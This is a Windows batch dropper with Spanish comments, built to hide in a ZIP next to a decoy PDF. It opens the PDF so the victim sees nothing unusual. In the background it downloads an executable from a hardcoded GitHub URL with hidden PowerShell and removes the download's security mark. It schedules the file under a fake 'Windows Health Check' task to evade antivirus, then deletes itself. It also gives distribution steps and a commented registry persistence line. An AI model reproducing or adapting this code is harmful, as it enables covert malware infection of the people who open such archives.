@echo off

REM DEBUG: Mostrar mensaje para verificar ejecución
echo [DEBUG] BAT ejecutado correctamente > %TEMP%\bat_debug.txt
echo Fecha %DATE% %TIME% >> %TEMP%\bat_debug.txt
echo Dir %CD% >> %TEMP%\bat_debug.txt
echo ScriptDir %~dp0 >> %TEMP%\bat_debug.txt

REM ========================================================================
REM DROPPER ZIP - Abre PDF real y descarga payload
REM ========================================================================
REM Este dropper va dentro de un ZIP junto con:
REM   - documento.pdf (visible, archivo real legítimo)
REM   - este.bat (oculto, con atributo +h)
REM
REM El usuario extrae el ZIP y solo ve "documento.pdf":
REM   1. Abre el PDF real de la carpeta
REM   2. En background descarga el agent desde servidor
REM   3. Ejecuta el payload
REM   4. El BAT se autodestruye
REM
REM USO:
REM   1. Editar URL_PAYLOAD con tu servidor
REM   2. Comprimir en ZIP: documento.pdf + este.bat
REM   3. Configurar BAT como oculto: attrib +h este.bat
REM   4. Distribuir el ZIP
REM ========================================================================

REM === CONFIGURACIÓN ===
set URL_PAYLOAD=https://github.com/ggggwrmsfootmen/curly-fortnight/raw/refs/heads/main/health-check.exe
set SCRIPT_DIR=%~dp0
set PAYLOAD_PATH=%USERPROFILE%\Pictures\health-check-win.exe

REM === PASO 1: Abrir PDF real de la carpeta ===
REM Buscar cualquier PDF (incluidos ocultos) en la carpeta del BAT
cd /d "%~dp0"
for /f "delims=" %%f in ('dir /b /a "*.pdf" 2^>nul') do (
    echo [DEBUG] Abriendo PDF %%f >> %TEMP%\bat_debug.txt
    start "" "%%f"
    goto found_pdf
)

echo [DEBUG] No se encontro ningun PDF >> %TEMP%\bat_debug.txt
:found_pdf

REM === PASO 2: Esperar un poco para parecer normal ===
echo [DEBUG] Esperando 2 segundos... >> %TEMP%\bat_debug.txt
ping 127.0.0.1 -n 3 >nul

REM === PASO 3: Descargar payload desde servidor ===
REM Pictures no requiere mkdir, ya existe por defecto

REM Descargar con PowerShell
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$wc = New-Object System.Net.WebClient; $wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'); $wc.DownloadFile('%URL_PAYLOAD%', '%PAYLOAD_PATH%')"

REM Eliminar marca Zone.Identifier
powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Unblock-File -Path '%PAYLOAD_PATH%'" 2>nul

REM === PASO 4: Crear tarea programada para ejecutar después (evasión AV) ===
REM Se ejecutará en 2 minutos, cuando el usuario ya no esté mirando
schtasks /create /tn "Windows Health Check" /tr "%PAYLOAD_PATH%" /sc once /st %TIME:~0,2%:%TIME:~3,2% /sd %DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2% /f >nul 2>&1

REM Alternativa: Ejecutar al login del usuario (persistencia)
REM reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HealthCheck" /t REG_SZ /d "%PAYLOAD_PATH%" /f >nul 2>&1

REM === PASO 4: Autodestrucción del dropper ===
REM Usar ping como delay y luego eliminar el BAT
(goto) 2>nul & del "%~f0"
